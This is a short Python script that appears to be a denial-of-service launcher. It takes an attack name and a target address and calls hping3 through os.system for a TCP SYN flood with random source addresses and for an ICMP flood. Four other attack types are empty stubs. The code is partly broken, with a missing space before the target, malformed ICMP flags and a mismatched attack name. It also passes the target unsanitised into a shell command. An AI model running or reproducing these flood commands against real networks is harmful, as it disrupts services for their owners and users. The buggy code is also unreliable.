import scapy
import sys
import os
attack = ["ip_spoof","udp_flood","icmp_flood","tcp_syn_flood","ping_of_death","land_attack"]


def attack_check(type,network):

    if type == "ip_spoof":
        pass
    elif type == "tcp_syn_flood":
        os.system("sudo hping3 -S --flood -V -p 1360 --rand-source -d 250" + network)
    elif type == "udp_flood":
        pass
    elif type == "icmp_flood":
        os.system("sudo hping3 -i -a --flood -d 300 " + network)
    elif type == "ping_of_death":
        pass
    elif type == "land_attack/nestea_attack":
        pass


if __name__ == "__main__":

    try: 
        attack_type = sys.argv[1]
    except IndexError as e:
        print("Attack type not provided: {}".format(e))
    
    try:
        network = sys.argv[2]
    except IndexError as e:
        print("Network address not provided: {}".format(e))


    if attack_type in attack:
        attack_check(attack_type,network)
        